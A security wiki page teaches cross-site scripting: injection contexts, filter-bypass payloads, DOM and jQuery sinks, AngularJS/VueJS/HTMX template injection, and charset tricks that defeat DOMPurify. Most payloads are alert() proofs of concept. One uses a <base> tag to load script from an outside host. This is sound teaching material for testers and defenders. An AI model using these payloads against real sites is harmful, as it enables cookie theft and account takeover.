---
description: Inject JavaScript code on victims to perform actions on their behalf
---

# Cross-Site Scripting (XSS)

## # Related Pages

{% content-ref url="../../../languages/javascript/" %}
[javascript](../../../languages/javascript/)
{% endcontent-ref %}

## Description

Cross-Site Scripting (XSS) is a very broad topic, but it revolves around one idea: executing malicious JavaScript. This is often from an attacker's site, hence "Cross-Site" scripting. A common distinction made between types of XSS is:

* **Reflected XSS**: Inject HTML as some content from a parameter that is _reflected_ directly on the target page. This payload is not stored and is seen only if the malicious URL is visited
* **Stored XSS**: Store a payload somewhere, which is later loaded insecurely which places the injected HTML directly onto the page. The difference here is that the payload is saved on the server side in some way, and is later retrieved by a victim
* **DOM XSS**: A special variant not using HTML, but rather the **D**ocument **O**bject **M**odel (DOM) in JavaScript code itself. When malicious data ends up in JavaScript "sinks" that are able to execute code, such as `location = "javascript:..."`, the payload is triggered via the DOM. The payload may still be either reflected or stored, but it is often called DOM XSS

The most basic form of XSS looks like this. Imagine a page that takes some parameter as input, and reflects it back in the response without any filtering:

```php
<?php echo $_GET["html"];
```

The intention might be that we can write some styled code like `<b>hello</b>` to write in **bold**, but instead, an attacker can use a tag like `<script>` to include JavaScript code:

```html
http://example.com/page?html=<script>alert(document.cookie)</script>
```

This will place the `document.cookie` value (all your Cookies, like session tokens) in a simple `alert()` box that pops up on your screen. This is a common proof-of-concept to show an attacker is able to access and possibly exfiltrate a user's cookies in order to impersonate them.

## Contexts

There are a few different places where your input might end up inside HTML to create dynamic pages. Here are a few common ones for example:

{% code title="Tag context" %}
```html
<p>INJECTION_HERE</p>
```
{% endcode %}

{% code title="Attribute context" %}
```html
<img src="INJECTION_HERE">
```
{% endcode %}

{% code title="Script context" %}
```html
<script>
    let a = "INJECTION_HERE";
</script>
```
{% endcode %}

Depending on the **context**, you will need different syntax to do the following steps:

1. Escape the original code, by closing tags (eg. `</textarea>`) or strings (`"` or `'`)
2. Write the JavaScript payload that will execute
3. Possibly fixing the rest of the code that normally comes after, to prevent errors

For the **Attribute context** as an example, we could exploit it by 1. Escaping by starting with a `"` that will close off the string, then 2. Add our own attribute like `onerror=alert()` to execute a function when the image fails to load, and finally 3. Close off the last quote by ending with something meaningless like `x="` that will be closed by a quote. Altogether it could look like this:

<pre class="language-html"><code class="lang-html">&#x3C;img src="INJECTION_HERE">
<strong>Payload: " onerror=alert() x="
</strong>&#x3C;img src="" onerror=alert() x="">
</code></pre>

When this is rendered to the page, the image with `src=""` will likely fail to load as the current page is not an image. Then the `onerror=` handler is triggered to pop an alert box open, and the tag is closed cleanly. This is the basic idea for all JavaScript Injections. The following sections will explore the various contexts in more detail.&#x20;

### HTML Injection

With zero protections, the simplest-to-understand injection is:

```html
<script>alert()</script>
```

This starts JavaScript syntax using the `<script>` tag, and executes the `alert()` function. There are however a few caveats that will result in this payload _not always working_. The most important is the difference between **server-inserted** code and **client-inserted** code. \
When the server inserts your script into the HTML, the browser doesn't know any better and trusts the code so it will be run as if it is part of the first original page. \
When instead the code is possibly fetched and then inserted by some other client-side JavaScript code like `element.innerHTML = "<script>..."`, it will be inserted after the document has already loaded, and follow some different rules. For one, inline scripts like these **won't** execute directly, as well as some other elements that are not directly loaded after they have been inserted into the DOM.&#x20;

Because of the above reasons, it is often a safer idea to use a common payload like:

```html
<img src onerror=alert()>
```

The special thing about this payload is that an image should be loaded, which the browser really wants to do as soon as it is inserted, even on the client side. This causes the `onerror=` handler to instantly trigger consistently, no matter how it is inserted (read more details in [#triggers](./#triggers "mention")).\
In some cases a common variation is the following:

<pre class="language-html"><code class="lang-html">&#x3C;!-- Shortest payload -->
<strong>&#x3C;svg onload=alert()>
</strong>&#x3C;!-- Short but universal -->
<strong>&#x3C;style onload=alert()>
</strong></code></pre>

The small difference between these two payloads is that the first works everywhere except **Firefox client-inserted**, and the second works everywhere while remaining relatively short.&#x20;

#### Special Tags

When inserted into the content of a `<textarea>`, JavaScript code won't be directly executed in any way. Therefore you need to first close this specific tag using `</textarea>`, and then continue with a regular XSS payload like normal.&#x20;

<pre class="language-html"><code class="lang-html">&#x3C;!-- Doesn't execute -->
&#x3C;textarea>&#x3C;img src onerror=alert()>&#x3C;/textarea>
&#x3C;!-- Does execute! -->
<strong>&#x3C;textarea>&#x3C;/textarea>&#x3C;img src onerror=alert()>&#x3C;/textarea>
</strong></code></pre>

#### Common Filter Bypasses

While the above are simple, they are also the most common, and many filters already recognize these patterns as malicious and block or sanitize your payload in some way that will try to make it safe. This topic is explored more in [#filter-bypasses](./#filter-bypasses "mention"), but a few of the best tricks are displayed here. The first is when a RegEx pattern like `<[^>]>` expects a `>` to close a tag, which can be omitted often because another future tag will close it for you:

{% code title="Payload" %}
```html
<style onload=alert() x=
```
{% endcode %}

{% code title="Context" %}
```html
<p><style onload=alert() x=</p>
```
{% endcode %}

It is common for dangerous tags to be blacklisted, and any event handler attributes like `onload` and `onerror` to be blocked. There are some payloads however that can _encode_ data to hide these obligatory strings (`&#110;` = HTML-encoded `n`, [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity\(true,'Numeric%20entities'\)\&input=bg)):

<pre class="language-html" data-overflow="wrap"><code class="lang-html">&#x3C;!-- Dynamically set href= attribute using SVG animation, with "javascript:" partially in attribute value -->
<strong>&#x3C;svg>&#x3C;a>&#x3C;animate attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://example.com?&#x26;semi;javascript:alert(origin)&#x26;semi;0" />&#x3C;text x=20 y=20>XSS&#x3C;/text>&#x3C;/a>
</strong>
&#x3C;!-- Using iframe srcdoc= attribute to include encoded HTML -->
<strong>&#x3C;iframe srcdoc="&#x26;lt;img src=1 o&#x26;#110;error=alert(1)&#x26;gt;">&#x3C;/iframe>
</strong>
&#x3C;!-- Link requiring user interaction with javascript: URL -->
<strong>&#x3C;a href="&#x26;#106aVaS&#x26;#99riPt:alert()">Click me!&#x3C;/a>
</strong>
&#x3C;!-- Using lesser-known src= and data= attributes, also with codebase= -->
<strong>&#x3C;iframe src="javascript:alert(origin)">&#x3C;/embed>
</strong><strong>&#x3C;embed src="javascript:alert(origin)">&#x3C;/embed>
</strong><strong>&#x3C;object data="javascript:alert(origin)">&#x3C;/object>
</strong></code></pre>

One last payload is a less well-known tag called `<base>` which takes an `href=` attribute that will decide where any **relative URLs will start** from. If you set this to your domain for example, and later in the document a `<script src="/some/file.js">` is loaded, it will instead be loaded from **your website** at the path of the script.

<pre class="language-html"><code class="lang-html"><strong>&#x3C;base href=//xss.jorianwoltjer.com>
</strong>
&#x3C;!-- Any normal relative script after this payload will be taken from the base -->
&#x3C;script src="/some/file.js">
&#x3C;!-- ^^ Will fetch 'http://xss.jorianwoltjer.com/some/file.js' instead! -->
</code></pre>

{% hint style="info" %}
To exploit and show a proof of concept of the above trick, I set up [xss.jorianwoltjer.com](https://xss.jorianwoltjer.com/) which  returns the same script for **every path** with any payload you put into that **URL hash**. This means you can include this injection anywhere, and put a JavaScript payload after the `#` symbol of the target URL which will then be executed:\
[http://example.com/path#alert(document.domain)](http://example.com/path#alert\(document.domain\))
{% endhint %}

See [#filter-bypasses](./#filter-bypasses "mention") for a more general approach for making your own bypass.

In case you really can't get a full-blown XSS, check out what other impactful things you may be able to do with [#html-injection](./#html-injection "mention").

#### Alternative Impact

**Styles** using CSS can also be dangerous. Not only to restyle the page, but with selectors and URLs any secrets on the page like CSRF tokens or other private data can be exfiltrated. For details on exploiting this, see [this introduction](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d), an [improved version using `@import`](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b), and finally [this tool](https://github.com/d0nutptr/sic).&#x20;

### Attribute Injection

While [#html-injection](./#html-injection "mention") is easy when you are injecting directly into a tag's contents, sometimes the injection point is inside a tag's attribute instead:

```html
<img src="INJECTION_HERE">
<img src='INJECTION_HERE'>
<img src=INJECTION_HERE>
```

This is a blessing and a curse because it might look harder at first, but this actually opens up some new attack ideas that might not have been possible before. Of course, the same HTML Injection idea from before works just as well, if we close the attribute and start writing HTML:

<pre class="language-html"><code class="lang-html"><strong>Payload: ">&#x3C;style onload=alert()>
</strong>&#x3C;img src="">&#x3C;style onload=alert()>">
</code></pre>

However, this is not always possible as the `<` and `>` characters are often HTML encoded like `&lt;` and `&gt;` to make them represent data, not code. This would not allow us to close the `<img>` tag or open a new tag to add an event handler to, but in this case we don't need it! Since we are already in an `<img>` tag, we can simply add an attribute to _it_ with a JavaScript event handler that will trigger:

<pre class="language-html"><code class="lang-html"><strong>Payload: " onerror=alert() x="
</strong>&#x3C;img src="" onerror=alert() x="">
</code></pre>

The same goes for `'` single quotes and no quotes at all, which just need spaces to separate attributes. Using the [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) you can filter for possible triggers of JavaScript using attributes on your specific tag by filtering it and looking at the payloads. Some of these will require some user interaction like `onclick=`, but others won't.\
A useful trick with `<input>` tags specifically is the `onfocus=` attribute, together with the `autofocus` attribute which will combine to make it into a payload not requiring user interaction.

<pre class="language-html"><code class="lang-html">&#x3C;input value="INJECTION_HERE">
<strong>Payload: " onfocus=alert() autofocus x="
</strong>&#x3C;input value="" onfocus=alert() autofocus x="">
</code></pre>

### Script Injection

A special case is when the injection is found inside of a `<script>` tag. This may be done by developers when they want to give JavaScript access to some data, often JSON or a string, without requiring another request to fetch that data. When implemented without enough sanitization, however, this can be very dangerous as _tags_ might not even be needed to reach XSS.

```html
<script>
    let a = "INJECTION_HERE";
</script>
```

As always, a possibility is simply closing the context and starting an [#html-injection](./#html-injection "mention"), this is common in JSON stringifictions because while the string may be safe, you can still close the script tag:

<pre class="language-html"><code class="lang-html"><strong>Payload: &#x3C;/script>&#x3C;style onload=alert()>
</strong>&#x3C;script>
    let a = "&#x3C;/script>&#x3C;style onload=alert()>";
&#x3C;/script>
</code></pre>

If these `<` or `>` characters are blocked or encoded however, we need to be more clever. Similarly to [#attribute-injection](./#attribute-injection "mention"), we can close only this **string**, and then write out arbitrary JavaScript code because are already in a `<script>` block. Using the `-` subtract symbol, JavaScript needs to evaluate both sides of the expression, and after seeing the empty `""` string, it will run the `alert()` function. Finally, we need to end with a comment to prevent `SyntaxError`s:

<pre class="language-html"><code class="lang-html"><strong>Payload: "-alert()//
</strong>&#x3C;script>
    let a = ""-alert()//"";
&#x3C;/script>
</code></pre>

Another special place you might find yourself injecting into is **template literals**, surrounded by `` ` `` backticks, which allow variables and expressions to be evaluated inside of the string. This opens up more possible syntax to run arbitrary JavaScript without even having to escape the string:

<pre class="language-html"><code class="lang-html"><strong>Payload: ${alert()}
</strong>&#x3C;script>
    let a = `${alert()}`;
&#x3C;/script>
</code></pre>

#### Double Injection `\` backslash trick

One last trick is useful when you **cannot escape** the string with just a `"` quote, but when you do have **two injections on the same line**.&#x20;

<pre class="language-html" data-title="Failed attempt"><code class="lang-html"><strong>Payload 1: "-alert()//
</strong><strong>Payload 2: something
</strong>&#x3C;script>
    let a = {first: "&#x26;quot;-alert()//", second: "something"};
&#x3C;/script>
</code></pre>

The important piece of knowledge is that any character escaped using a `\` backslash character, which will interpret the character as data instead of code (see [here ](../../../languages/javascript/#inside-a-string)for a table of all special backslash escapes). \
With this knowledge, we know a `\"` character will continue the string and not stop it. Therefore if we **end** our input with a `\` character, a `"` quote will be appended to it which would normally close the string, but because of our injection cause it to continue and mess up the syntax:

<pre class="language-html" data-title="Injection causes error"><code class="lang-html"><strong>Payload 1: anything\
</strong><strong>Payload 2: something
</strong>&#x3C;script>
    let a = {first: "anything\", second: "something"};
&#x3C;/script>
</code></pre>

The critical part here is that the 2nd string that would normally _start_ the string is now _stopping the first_ string instead. Afterwards, it switches to regular JavaScript context starting directly with our second input, which no longer needs to escape anything. If we now write valid JavaScript here, it will execute (note that we also have to _close the `}`_):

<pre class="language-html" data-title="Success"><code class="lang-html"><strong>Payload 1: anything\
</strong><strong>Payload 2: -alert()}//
</strong>&#x3C;script>
    let a = {first: "anything\", second: "-alert()}//"};
&#x3C;/script>
</code></pre>

#### Escaped `/` bypass using `<!--` comment

When injecting into a script tag that disallows quotes (`"`), you may quickly jump to injecting `</script>` to close the whole script tag and start a new one with your payload. If the `/` character is not allowed, however, you cannot close the script tag in this way.

Instead, we can abuse a lesser-known feature of script contents ([spec](https://html.spec.whatwg.org/multipage/scripting.html#restrictions-for-contents-of-script-elements)), where for legacy reasons, \
a closing script tag (`</script>`) inside `<!--` doesn't actually close the current script. Note that this is in JavaScript syntax, and that this can occur anywhere, like inside of a string. Only once some later input closes the script tag an extra time does it actually close!\
This strange behavior occurs because ([source](https://htmlparser.info/parser/#script-states)):

> 1. Some pages assume they can use the string "`</script>`" inside a script if they enclose the script content in `<!-- … -->`, due to some previous parsing quirks of comment tags.
> 2. Other pages have `<!--` at the start of the script but forget `-->` from the end.

This can cause an interesting exploit as shown in the example below ([source](https://www.creds.nl/2024-07-18-overlooked-xss-vector), [another example](https://x.com/garethheyes/status/1813658752245236105)):

<pre class="language-html" data-title="Vulnerable"><code class="lang-html">&#x3C;script>
  console.log("<a data-footnote-ref href="#user-content-fn-1">INPUT1</a>");
&#x3C;/script>
&#x3C;input type="text" value="<a data-footnote-ref href="#user-content-fn-2">INPUT2</a>">
</code></pre>

<pre class="language-html" data-title="Exploit" data-line-numbers><code class="lang-html">&#x3C;script>
<strong>  console.log("&#x3C;!--&#x3C;script>");
</strong>&#x3C;/script>
<strong>&#x3C;input type="text" value="&#x3C;/script>&#x3C;script>alert()&#x3C;/script>">
</strong></code></pre>

Notice that the closing script tag on line 3 doesn't close it anymore, but instead, only after closing it a second time inside of the attribute. We are then in an HTML context and can write any XSS payload without double-quotes!

{% hint style="info" %}
For more advanced tricks and pitfalls, check out the [javascript](../../../languages/javascript/ "mention") page.
{% endhint %}

### DOM XSS

This is slightly different than previous "injection" ideas and is more focused on what special syntax can make certain "sinks" execute JavaScript code.

{% embed url="https://github.com/wisec/domxsswiki/wiki" %}
Big and up-to-date collection of DOM XSS sources, sinks and techniques
{% endembed %}

The **D**ocument **O**bject **M**odel (DOM) is JavaScript's view of the HTML on a page. To create complex logic and interactivity with elements on the page there are some functions in JavaScript that allow you to interact with it. As a simple example, the `document.getElementById()` function can find an element with a specific `id=` attribute, on which you can then access properties like `.innerHTML`:

```html
<p id="hello">Hello, <b>world</b>!</p>
<script>
    let element = document.getElementById("hello");
    console.log(element.innerHTML);  // "Hello, <b>world</b>!"
</script>
```

**DOM XSS** is where an attacker can abuse the interactivity with HTML functions from within JavaScript by providing _sources_ that contain a payload, which end up in _sinks_ where a payload may trigger. A common example is setting the `.innerHTML` property of an element, which replaces all HTML children of that element with the string you set. If an attacker controls any part of this without sanitization, they can perform [#html-injection](./#html-injection "mention") just as if it was reflected by the server. A payload like the following would instantly trigger an `alert()`:

```html
<p id="hello">Hello, world!</p>
<script>
    let element = document.getElementById("hello");
    element.innerHTML = "<img src onerror=alert()>";
</script>
```

Sources are where data comes from, and there are many for JavaScript. There might be a URL parameter from [`URLSearchParams`](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/URLSearchParams) that is put in some HTML code, `location.hash` for `#...` data after a URL, simply a `fetch()`, `document.referrer`, and even `"message"` listeners which allow [`postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) communication between origins.&#x20;

When any of this controllable data ends up in a sink without enough sanitization, you might have an XSS on your hands. Just like contexts, different sinks require different payloads. A `location =` sink for example, can be exploited using the `javascript:alert()` protocol to evaluate the code, and an `eval()` sink could require escaping the context like in [#script-injection](./#script-injection "mention").

{% hint style="info" %}
**Note**: A special less-known property is `window.name` which is surprisingly also cross-origin writable. If this value is used in any sink, you can simply open it in an iframe or window like shown below and set the `.name` property on it!
{% endhint %}

#### JQuery - `$()`

A special case is made for JQuery as it is still to this day a popular library used by many applications to ease DOM manipulation from JavaScript. The `$()` selector can find an element on the page with a similar syntax to the more verbose but native `document.querySelector()` function (CSS Selectors). It would make sense that these selectors would be safe, but if unsanitized **user input** finds its way into the selector string of this `$` function, it will actually lead to XSS as `.innerHTML` is used under the hood!

A snippet like the following was very commonly exploited ([source](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery)):

<pre class="language-javascript" data-title="Old vulnerable example"><code class="lang-javascript">$(window).on('hashchange', function() {
<strong>    var element = $(location.hash);
</strong>    element[0].scrollIntoView();
});
</code></pre>

Here the `location.hash` _source_ is put into the vulnerable _sink_, which is exploitable with a simple `#<img src onerror=alert()>` payload. In the snippet, this is called on the [`hashchange`](https://developer.mozilla.org/en-US/docs/Web/API/Window/hashchange_event) event it is not yet triggered on page load, but only after the hash has _changed_. In order to exploit this, we need to load the page normally first, and then after some time when the page has loaded we can replace the URL of the active window which will act as a "change". Note that **reading** a location is not allowed cross-origin, but **writing** a new location is, so we can abuse this.&#x20;

If the target allows being iframed, a simple way to exploit this is by loading the target and changing the `src=` attribute after it loads:

{% code title="Using iframe" %}
```html
<iframe src="https://target.com/#" onload="this.src+='<img src onerror=alert()>'">
```
{% endcode %}

Otherwise, you can still load and change a URL by `open()`'ing it in a new window, waiting some time, and then changing the location of the window you held on to (note that the [`open()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) method requires user interaction like an `onclick=` handler to be triggered):

{% code title="Using window" %}
```html
<button onclick=start()>Start</button>
<script>
    function start() {  // Open a new tab
        let target = open("https://target.com/#");
        setTimeout(function () {  // Wait for target to load
            target.location = "https://target.com/#<img src onerror=alert()>";
        }, 2000);
    }
</script>
```
{% endcode %}

Important to note is that the vulnerable code above with `$(location.hash)` above is **not vulnerable anymore** with recent versions of JQuery because an extra rule was added that selectors _starting_ with `#` are _not_ allowed to have HTML, but **anything else is still vulnerable**. A snippet like below will still be vulnerable in modern versions because it is not prefixed with `#`, and it URL decodes the payload allowing the required special characters. Context does not matter here, simply `<img src onerror=alert()>` anywhere in the selector will work.&#x20;

{% code title="Modern vulnerable example" %}
```javascript
let hash = decodeURIComponent(window.location.hash.slice(1));
$(`h2:contains(${hash})`);
```
{% endcode %}

JQuery also has many other methods and CVEs if malicious input ends up in specific functions. Make sure to check all functions your input travels through for possible DOM XSS.&#x20;

#### Triggers (HTML sinks)

1. {% code title=".innerHTML" %}
   ```javascript
   let div = document.createElement("div")
   div.innerHTML = "<img src onerror=alert()>"
   ```
   {% endcode %}
2. {% code title=".innerHTML + DOM" %}
   ```javascript
   let div = document.createElement("div")
   document.body.appendChild(div)
   div.innerHTML = "<img src onerror=alert()>"
   ```
   {% endcode %}
3. {% code title="write()" %}
   ```javascript
   document.write("<img src onerror=alert()")
   ```
   {% endcode %}
4. {% code title="open() write() close()" %}
   ```javascript
   document.open()
   document.write("<img src onerror=alert()")
   document.close()
   ```
   {% endcode %}

When placing common XSS payloads in the triggers above, it becomes clear that they are not all the same. Most notably, the `<img src onerror=alert()>` payload is the most universal as it works in every situation, even when it is not added to the DOM yet. The common and short `<svg onload=alert()>` payload is interesting as it is only triggered via `.innerHTML` on Chome, and not Firefox. Lastly, the `<script>` tag does not load when added with `.innerHTML` at all.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>

{% file src="../../../.gitbook/assets/domxss-trigger-table.html" %}
**Source code** for script used to generate and **test** the results in the table above
{% endfile %}

### Client-Side Template Injection

Templating frameworks help fill out HTML with user data and try to make interaction easier. While this often helps with auto-escaping special characters, it can hurt in some other ways when the templating language itself can be injected without HTML tags, or using normally safe HTML that isn't sanitized.

#### [AngularJS](https://docs.angularjs.org/guide/templates)

AngularJS is a common web framework for the frontend. It allows easy interactivity by adding special attributes and syntax that it recognizes and executes. This also exposes some new ways for HTML/Text injections to execute arbitrary JavaScript if regular ways are blocked. One caveat is that all these injections need to happen inside an element with an `ng-app` attribute to enable this feature.&#x20;

When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `{{` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.&#x20;

Here are a few examples of how it can be abused on the latest version. All alerts fire on load:

<pre class="language-html"><code class="lang-html">&#x3C;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js">&#x3C;/script>

&#x3C;body ng-app>
<strong>  &#x3C;!-- Text injection -->
</strong>  {{constructor.constructor('alert(1)')()}}
<strong>  &#x3C;!-- Attribute injection -->
</strong>  &#x3C;ANY ng-init="constructor.constructor('alert(2)')()">&#x3C;/ANY>
<strong>  &#x3C;!-- Filter bypass (even DOMPurify!) -->
</strong>  &#x3C;ANY data-ng-init="constructor.constructor('alert(3)')()">&#x3C;/ANY>
  &#x3C;ANY class="ng-init:constructor.constructor('alert(4)')()">&#x3C;/ANY>
  &#x3C;ANY class="AAA;ng-init:constructor.constructor('alert(5)')()">&#x3C;/ANY>
  &#x3C;ANY class="AAA!ng-init:constructor.constructor('alert(6)')()">&#x3C;/ANY>
  &#x3C;ANY class="AAA♩♬♪ng-init:constructor.constructor('alert(7)')()">&#x3C;/ANY>
<strong>  &#x3C;!-- Dynamic content insertion also vulnerable (only during load) -->
</strong>  &#x3C;script>
    document.body.innerHTML += `&#x3C;ANY ng-init="constructor.constructor('alert(8)')()">&#x3C;/ANY>`;
  &#x3C;/script>
&#x3C;/body>
<strong>&#x3C;!-- Everything also works under `data-ng-app`, fully bypassing DOMPurify! -->
</strong>&#x3C;div data-ng-app>
  ...
  &#x3C;b data-ng-init="constructor.constructor('alert(9)')()">&#x3C;/b>
&#x3C;/div>
</code></pre>

In some older versions of AngularJS, there was a sandbox preventing some of these arbitrary code executions. Every version has been bypassed, however, leading to how it is now without any sandbox. See the following page for a history of these older sandboxes:

{% embed url="https://portswigger.net/research/dom-based-angularjs-sandbox-escapes" %}
Escape different AngularJS version sandboxes
{% endembed %}

{% hint style="warning" %}
**Warning**:&#x20;

**Newer versions** of _Angular (v2+)_ instead of _AngularJS (v1)_ are not vulnerable in this way. \
Read more about this in [angular.md](../../frameworks/angular.md "mention").
{% endhint %}

{% hint style="info" %}
**Note**: Injecting content with `.innerHTML` does not always work, because it is only triggered _when AngularJS loads_. If you inject content later from a fetch, for example, it would not trigger even if a parent contains `ng-app`.&#x20;

You may still be able to exploit this by slowing down the AngularJS script loading by **filling up the browser's connection pool**. [See this challenge writeup for details](https://blog.ryotak.net/post/dom-based-race-condition/).
{% endhint %}

#### [VueJS](https://vuejs.org/guide/essentials/template-syntax.html)

```html
<script src="https://cdn.jsdelivr.net/npm/vue@2.5.13/dist/vue.js"></script>

<div id="app">
  <p>{{this.constructor.constructor('alert(1)')()}}</p>
  <p>{{this.$el.ownerDocument.defaultView.alert(2)}}</p>
</div>
<script>
  new Vue({
    el: "#app",
  });
</script>
```

{% embed url="https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets" %}
Detailed research into VueJS payloads and filter bypasses
{% endembed %}

#### [HTMX](https://htmx.org/docs/)

<pre class="language-html"><code class="lang-html">&#x3C;script src="https://unpkg.com/htmx.org@1.9.12">&#x3C;/script>

<strong>&#x3C;!-- Old syntax, simple eval -->
</strong>&#x3C;img src="x" hx-on="error:alert(1)" />
<strong>&#x3C;!-- Normally impossible elements allow injecting JavaScript into eval'ed function! -->
</strong>&#x3C;meta hx-trigger="x[1)}),alert(2);//]" />
&#x3C;div hx-disable>
<strong>  &#x3C;!-- Inside hx-disable, new syntax still works -->
</strong>  &#x3C;img src="x" hx-on:error="alert(3)" />
<strong>  &#x3C;!-- Everything can be prefixed with data-, bypassing DOMPurify! -->
</strong>  &#x3C;img src="x" data-hx-on:error="alert(4)" />
&#x3C;/div>
</code></pre>

### Alternative Charsets

{% embed url="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/" %}
Source explaining XSS tricks when a charset definition is missing from a response, abusing ISO-2022-JP
{% endembed %}

{% hint style="info" %}
**Note**: In this section, some ESC characters are replaced with `\x1b` for clarity. You can copy a real ESC control character from the code block below:

<pre><code><strong>
</strong></code></pre>
{% endhint %}

If a response contains _any_ of the following two lines, it is _safe_ from the following attack.

<pre class="language-http" data-title="Safe"><code class="lang-http"><strong>Content-Type: text/html; charset=utf-8
</strong>...
<strong>&#x3C;meta charset="UTF-8">
</strong></code></pre>

If this charset is missing, however, things get interesting. Browsers **automatically detect encodings** in this scenario. The ISO-2022-JP encoding has the following special escape sequences:

<table><thead><tr><th width="195">Escape Sequence</th><th width="164">Copy</th><th>Meaning</th></tr></thead><tbody><tr><td><code>\x1b(B</code></td><td><pre><code>(B
</code></pre></td><td>switch to <em>ASCII</em> (default)</td></tr><tr><td><code>\x1b(J</code></td><td><pre><code>(J
</code></pre></td><td>switch to <em>JIS X 0201 1976</em> (backslash swapped)</td></tr><tr><td><code>\x1b$@</code></td><td><pre><code>$@
</code></pre></td><td>switch to <em>JIS X 0201 1978</em> (2 bytes per char)</td></tr><tr><td><code>\x1b$B</code></td><td><pre><code>$B
</code></pre></td><td>switch to <em>JIS X 0201 1983</em> (2 bytes per char)</td></tr></tbody></table>

These sequences can be used at any point in the HTML context (not JavaScript) and instantly switch how the browser maps bytes to characters. _JIS X 0201 1976_ is almost the same as ASCII, except for `\` being replaced with `¥`, and `~` replaced with `‾`.

<figure><img src="../../../.gitbook/assets/image (51).png" alt="" width="479"><figcaption><p>Table showing mapping from byte to character in <em>JIS X 0201 1976</em></p></figcaption></figure>

#### 1. Negating Backslash Escaping

For the first attack, we can make `\` characters useless after having written `\x1b(J`. Strings inside `<script>` tags are often protected by escaping quotes with backslashes, so this can bypass such protections:

<figure><img src="../../../.gitbook/assets/image (52).png" alt="" width="563"><figcaption><p>1. Input in HTML (search) and JavaScript string (lang) escaped correctly</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (53).png" alt="" width="563"><figcaption><p>2. Bypass using <em>JIS X 0201 1976</em> escape sequence in search, ignoring backslashes and escaping with quote</p></figcaption></figure>

```html
You searched for: (J
<script>
  var language = "en\";alert(1)//";
</script>
```

#### 2. Breaking HTML Context

The _JIS X 0201 1978_ and _JIS X 0201 1983_ charsets are useful for a different kind of attack. They turn sequences of 2 bytes into 1 character, effectively obfuscating any characters that would normally come after it. This continues until another escape sequence to reset the encoding is encountered like switching to _ASCII_.

An example is if you have control over some value in an attribute that is later closed with a double quote (`"`). By inserting this switching escape sequence, the succeeding bytes including this closing double quote will become invalid Unicode, and lose their meaning.

<figure><img src="../../../.gitbook/assets/image (28) (1).png" alt="" width="563"><figcaption><p>In markdown, our image alt text ends up in the <code>&#x3C;img alt=</code> attribute</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (54).png" alt="" width="563"><figcaption><p>Writing the <em>JIS X 0201 1978</em> escape sequence obfuscates the succeeding characters</p></figcaption></figure>

By later in a **different context** ending the obfuscation with a reset to _ASCII_ escape sequence, we will still be in the attribute context for HTML's sake. The text that was sanitized as text before, is now put into an attribute which can cause all sorts of issues.

<figure><img src="../../../.gitbook/assets/image (29) (2).png" alt="" width="563"><figcaption><p>Text in markdown ends obfuscation using <em>ASCII</em> escape sequence, continuing the attribute</p></figcaption></figure>

With the next image tag being created, it creates an unexpected scenario where the opening tag is actually still part of the attribute, and the opening of its first attribute instead closes the existing one.

<figure><img src="../../../.gitbook/assets/image (55).png" alt="" width="563"><figcaption><p>Later image tag still part of the exploited attribute, only closed after trying to open first attribute</p></figcaption></figure>

The `1.png` string is now syntax-highlighted as <mark style="color:red;">red</mark>, meaning it is now the **name of an attribute** instead of a value. If we write `onerror=alert(1)//` here instead, a malicious attribute is added that will execute JavaScript without being sanitized:

<figure><img src="../../../.gitbook/assets/image (30) (1).png" alt="" width="563"><figcaption><p>Adding malicious attribute after context confusion creates successful XSS payload</p></figcaption></figure>

{% hint style="info" %}
**Note**: It is _not possible_ to abuse _JIS X 0201 1978_ or _JIS X 0201 1983_ (2 bytes per char) encoding to write arbitrary ASCII characters instead of Unicode garbage. Only some Japanese characters and ASCII full-width alternatives can be created ([source](https://en.wikipedia.org/wiki/JIS_X_0208)), except for two unique cases that can generate a `$` and `(` character found using this fuzzer:\
[https://shazzer.co.uk/vectors/66efda1eacb1e3c22aff755c](https://shazzer.co.uk/vectors/66efda1eacb1e3c22aff755c)
{% endhint %}

This technique can also trivially **bypass any server-side** XSS protection (eg. DOMPurify) such as in the following challenge:

[https://gist.github.com/kevin-mizu/9b24a66f9cb20df6bbc25cc68faf3d71](https://gist.github.com/kevin-mizu/9b24a66f9cb20df6bbc25cc68faf3d71)

{% code title="Payload" %}
```html
<img src="src\x1b$@">text\x1b(B<img src="onerror=alert()//">
```
{% endcode %}

The missing charset behavior may be common in **file uploads**, and [`Blob`](https://developer.mozilla.org/en-US/docs/Web/API/Blob) URLs which are created by explicitly writing a content type in JavaScript. Developers often forget the charset:

```javascript
const html = `<img src="src\x1b$@">text\x1b(B<img src="onerror=alert(origin)//">`;
const blob = new Blob([html], { type: "text/html" });  // missing charset here
window.open(URL.createObjectURL(blob));  // opened in another top-level context
```

Not in all context will the charset be heuristically detected. The _top-most same-origin frame_ will decide, so if the above blob URL was iframed, for example, the exploit wouldn't work. This is because the parent frame's charset will be inherited by the iframe, it won't be detected again.

#### Browser charset detection

